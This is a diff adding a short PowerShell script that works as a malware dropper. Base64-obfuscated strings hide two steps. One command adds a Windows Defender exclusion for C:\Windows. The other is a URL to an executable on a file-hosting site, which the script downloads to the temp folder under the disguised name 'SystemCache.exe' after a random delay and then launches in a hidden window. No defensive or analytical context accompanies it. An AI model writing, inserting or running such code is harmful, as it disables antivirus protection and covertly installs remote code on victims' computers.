@@ -1,0 +1,12 @@
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCBDOlxXaW5kb3dz"))
+Invoke-Expression $cmd
+
+$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly93d3cudXBsb2FkLmVlL2Rvd25sb2FkLzE4MTg1MDQ0LzQ0MzQ5OWM1YTZjNzIwY2FiNjIyL3ZtLmV4ZQ=="))
+$output = "$env:Temp\SystemCache.exe"
+
+Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1500)
+(New-Object Net.WebClient).DownloadFile($url, $output)
+
+Start-Process $output -WindowStyle Hidden
